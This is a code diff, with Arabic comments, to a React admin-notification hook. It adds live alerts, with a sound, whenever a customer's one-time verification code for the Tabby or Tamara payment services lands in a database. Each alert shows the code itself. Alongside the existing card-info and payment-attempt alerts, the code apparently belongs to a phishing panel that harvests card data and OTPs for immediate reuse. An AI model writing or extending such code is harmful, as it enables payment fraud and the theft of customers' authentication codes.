@@ -7,6 +7,7 @@ export const useAdminNotifications = () => {
   const audioRef = useRef<HTMLAudioElement | null>(null);
   const paymentAudioRef = useRef<HTMLAudioElement | null>(null);
   const cardInfoAudioRef = useRef<HTMLAudioElement | null>(null);
+  const otpAudioRef = useRef<HTMLAudioElement | null>(null);
   const location = useLocation();
 
   useEffect(() => {
@@ -27,6 +28,10 @@ export const useAdminNotifications = () => {
     // إنشاء عنصر الصوت لإدخال بيانات البطاقة
     cardInfoAudioRef.current = new Audio('/card-info-notification.mp3');
     cardInfoAudioRef.current.volume = 0.7;
+
+    // إنشاء عنصر الصوت لإدخال OTP
+    otpAudioRef.current = new Audio('/otp-notification.mp3');
+    otpAudioRef.current.volume = 0.7;
 
     // الاستماع للطلبات الجديدة
     const ordersChannel = supabase
@@ -170,6 +175,46 @@ export const useAdminNotifications = () => {
       )
       .subscribe();
 
+    // الاستماع لإدخال OTP - تابي
+    const tabbyOtpAttemptsChannel = supabase
+      .channel('admin-tabby-otp-attempts')
+      .on(
+        'postgres_changes',
+        {
+          event: 'INSERT',
+          schema: 'public',
+          table: 'tabby_otp_attempts'
+        },
+        (payload) => {
+          playOtpSound();
+          toast.success('عميل أدخل رمز التحقق في تابي!', {
+            description: `رمز التحقق: ${payload.new.otp_code || '****'}`,
+            duration: 5000,
+          });
+        }
+      )
+      .subscribe();
+
+    // الاستماع لإدخال OTP - تمارة
+    const tamaraOtpAttemptsChannel = supabase
+      .channel('admin-tamara-otp-attempts')
+      .on(
+        'postgres_changes',
+        {
+          event: 'INSERT',
+          schema: 'public',
+          table: 'tamara_otp_attempts'
+        },
+        (payload) => {
+          playOtpSound();
+          toast.success('عميل أدخل رمز التحقق في تمارة!', {
+            description: `رمز التحقق: ${payload.new.otp_code || '****'}`,
+            duration: 5000,
+          });
+        }
+      )
+      .subscribe();
+
     return () => {
       supabase.removeChannel(ordersChannel);
       supabase.removeChannel(tamaraChannel);
@@ -178,6 +223,8 @@ export const useAdminNotifications = () => {
       supabase.removeChannel(mainPaymentAttemptsChannel);
       supabase.removeChannel(tabbyPaymentAttemptsChannel);
       supabase.removeChannel(tamaraPaymentAttemptsChannel);
+      supabase.removeChannel(tabbyOtpAttemptsChannel);
+      supabase.removeChannel(tamaraOtpAttemptsChannel);
     };
   }, [location.pathname]);
 
@@ -204,6 +251,15 @@ export const useAdminNotifications = () => {
       cardInfoAudioRef.current.currentTime = 0;
       cardInfoAudioRef.current.play().catch((error) => {
         console.error('Error playing card info notification sound:', error);
+      });
+    }
+  };
+
+  const playOtpSound = () => {
+    if (otpAudioRef.current) {
+      otpAudioRef.current.currentTime = 0;
+      otpAudioRef.current.play().catch((error) => {
+        console.error('Error playing OTP notification sound:', error);
       });
     }
   };
